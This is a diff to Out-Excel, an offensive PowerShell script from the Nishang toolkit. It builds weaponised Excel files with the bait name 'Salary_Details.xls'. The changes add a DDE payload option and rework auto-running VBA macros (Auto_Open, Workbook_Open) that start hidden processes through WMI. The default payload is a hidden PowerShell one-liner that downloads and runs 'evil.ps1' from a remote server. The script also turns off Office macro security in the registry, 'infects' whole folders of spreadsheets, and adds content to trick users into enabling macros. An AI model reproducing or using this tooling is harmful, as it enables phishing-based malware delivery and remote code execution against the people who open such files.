@@ -34,12 +34,12 @@ Arguments to the powershell script to be executed on the target. To be used with
 The directory which contains MS Excel files which are to be "infected".
 
 .PARAMETER OutputFile
-The path for the output Excel file. Default is Salary_Details.doc in the current directory.
+The path for the output Excel file. Default is Salary_Details.xls in the current directory.
 
 .PARAMETER Recurse
 Recursively look for Excel files in the ExcelFileDir
 
-.PARAMETER RemoveDocx
+.PARAMETER Removexlsx
 When using the ExcelFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.
 
 .PARAMETER RemainSafe
@@ -48,21 +48,21 @@ Use this switch to turn on Macro Security on your machine after using Out-Excel.
 .EXAMPLE
 PS > Out-Excel -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process" -RemainSafe
 
-Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
+Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.xls" would be generated
 in the current directory.
 
 .EXAMPLE
 PS > Out-Excel -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 
 
 Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
-you must pass the parameters in the script itself. A file named "Salary_Details.doc" would be generated in the 
+you must pass the parameters in the script itself. A file named "Salary_Details.xls" would be generated in the 
 current directory with the script used as encoded payload.
 
 .EXAMPLE
 PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1
 
 Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
-named "Salary_Details.doc" would be generated  in the current directory.
+named "Salary_Details.xls" would be generated  in the current directory.
 
 .EXAMPLE
 PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil
@@ -76,25 +76,25 @@ PS > Out-Excel -PayloadURL http://yourwebserver.com/Powerpreter.psm1 -Arguments 
 Use above for multiple payloads. The idea is to use a script or module as payload which loads multiple functions. 
 
 .EXAMPLE
-PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\docfiles\Generated.doc
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\xlsfiles\Generated.xls
 
 In above, the output file would be saved to the given path.
 
 .EXAMPLE
-PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\docfiles\
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\
 
-In above, in the C:\docfiles directory, macro enabled .doc files would be created for all the .docx files, with the same name
+In above, in the C:\xlsfiles directory, macro enabled .xls files would be created for all the .xlsx files, with the same name
 and same Last MOdified Time.
 
 .EXAMPLE
-PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\docfiles\ -Recurse
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse
 
-The above command would search recursively for .docx files in C:\docfiles.
+The above command would search recursively for .xlsx files in C:\xlsfiles.
 
 .EXAMPLE
-PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\docfiles\ -Recurse -RemoveDocx
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse -Removexlsx
 
-The above command would search recursively for .docx files in C:\docfiles, generate macro enabled .doc files and
+The above command would search recursively for .xlsx files in C:\xlsfiles, generate macro enabled .xls files and
 delete the original files.
 
 .EXAMPLE
@@ -119,8 +119,8 @@ https://github.com/samratashok/nishang
 #>
 
 
-    [CmdletBinding()] Param(
-        [Parameter(Position=0, Mandatory = $False)]
+    [CmdletBinding(DefaultParameterSetName="None")] Param(
+        [Parameter(ParameterSetName="Macro",Position=0, Mandatory = $False)]
         [String]
         $Payload,
         
@@ -136,27 +136,31 @@ https://github.com/samratashok/nishang
         [String]
         $Arguments,
 
-        [Parameter(Position=4, Mandatory = $False)]
+        [Parameter(ParameterSetName="DDE",Position=0, Mandatory = $False)]
         [Switch]
         $DDE,
-        
-        [Parameter(Position=5, Mandatory = $False)]
+
+        [Parameter(ParameterSetName="DDE",Position=1, Mandatory = $False)]
         [String]
-        $ExcelFileDir,
+        $DDEPayload,
         
         [Parameter(Position=6, Mandatory = $False)]
         [String]
+        $ExcelFileDir,
+        
+        [Parameter(Position=7, Mandatory = $False)]
+        [String]
         $OutputFile="$pwd\Salary_Details.xls",
 
-        [Parameter(Position=7, Mandatory = $False)]
+        [Parameter(Position=8, Mandatory = $False)]
         [Switch]
         $Recurse,
         
-        [Parameter(Position=8, Mandatory = $False)]
+        [Parameter(Position=9, Mandatory = $False)]
         [Switch]
         $RemoveXlsx,
 
-        [Parameter(Position=9, Mandatory = $False)]
+        [Parameter(Position=10, Mandatory = $False)]
         [Switch]
         $RemainUnSafe
     )
@@ -192,7 +196,7 @@ https://github.com/samratashok/nishang
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
 
-    if(!$Payload)
+    if(!$Payload -and !$DDEPayload)
     {
         #Download-Execute payload for DDE
         # User prompt modification technique from https://null-byte.wonderhowto.com/how-to/exploit-dde-microsoft-office-defend-against-dde-based-attacks-0180706/
@@ -201,49 +205,6 @@ https://github.com/samratashok/nishang
         #Download-Execute payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }
-
-
-    #Macro Code
-    #Macro code from here http://enigma0x3.Excelpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
-    $CodeAuto = @"
-    Sub Auto_Open()
-    Execute
-
-    End Sub
-
-
-         Public Function Execute() As Variant
-            Const HIDDEN_WINDOW = 0
-            strComputer = "."
-            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
-            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-            Set objConfig = objStartup.SpawnInstance_
-            objConfig.ShowWindow = HIDDEN_WINDOW
-            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create "$Payload", Null, objConfig, intProcessID
-         End Function
-"@
-
-    $CodeWorkbook = @"
-    Sub Workbook_Open()
-    Execute
-
-    End Sub
-
-
-         Public Function Execute() As Variant
-            Const HIDDEN_WINDOW = 0
-            strComputer = "."
-            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
-            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-            Set objConfig = objStartup.SpawnInstance_
-            objConfig.ShowWindow = HIDDEN_WINDOW
-            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create "$Payload", Null, objConfig, intProcessID
-         End Function
-"@
 
 
     if($PayloadScript)
@@ -329,29 +290,93 @@ https://github.com/samratashok/nishang
         {
             $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
         }
-        $Payload = $FinalPayload
+        #Macro Code
+        #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
+        $CodeAuto = @"
+        Sub Auto_Open()
+        Execute
 
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create $FinalPayload, Null, objConfig, intProcessID
+             End Function
+"@
+
+        $CodeWorkbook = @"
+        Sub Workbook_Open()
+        Execute
+
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create $FinalPayload, Null, objConfig, intProcessID
+             End Function
+"@
     }
-    #If the payload is small in size, there is no need of multiline macro.
+     #If the payload is small in size, there is no need of multiline macro.
     else
     {
-        #Macro Code (inspired from metasploit)
-        $code_one = @"
-
-        Sub Execute
-            Dim payload
-            payload = "$Payload"
-            Call Shell(payload, vbHide)
-        End Sub
-
+        # Escape double quotes. Useful for regsvr32 payloads where double quotes are used. 
+        $FinalPayload = $Payload -replace '"','""'
+        $CodeAuto = @"
         Sub Auto_Open()
-            Execute
-        End Sub
-        Sub Workbook_Open()
-            Execute
+        Execute
+
         End Sub
 
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create "$FinalPayload", Null, objConfig, intProcessID
+             End Function
 "@
+
+        $CodeWorkbook = @"
+        Sub Workbook_Open()
+        Execute
+
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create "$Payload", Null, objConfig, intProcessID
+             End Function
+"@
+
     }
 
 
@@ -375,7 +400,7 @@ https://github.com/samratashok/nishang
                 Write-Verbose "Using the DDE technique for dir."
                 if(!$DDEPayload)
                 {
-                    $WorkSheet.Cells.Item(50,50) = $Payloadg
+                    $WorkSheet.Cells.Item(50,50) = $Payload
                 }
                 else
                 {
@@ -386,7 +411,7 @@ https://github.com/samratashok/nishang
             {
                 Write-Verbose "Using auto-executable macro."
                 $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
-                $ExcelModule.CodeModule.AddFromString($code_one)
+                $ExcelModule.CodeModule.AddFromString($CodeWorkbook)
             }
             $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
             #Append .xls to the original file name if file extensions are hidden for known file types.
@@ -436,7 +461,7 @@ https://github.com/samratashok/nishang
         {
             Write-Verbose "Using auto-executable macro."
             $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
-            $ExcelModule.CodeModule.AddFromString($code_one)
+            $ExcelModule.CodeModule.AddFromString($CodeAuto)
         }
 
         #Add stuff to trick user in Enabling Content (running macros)
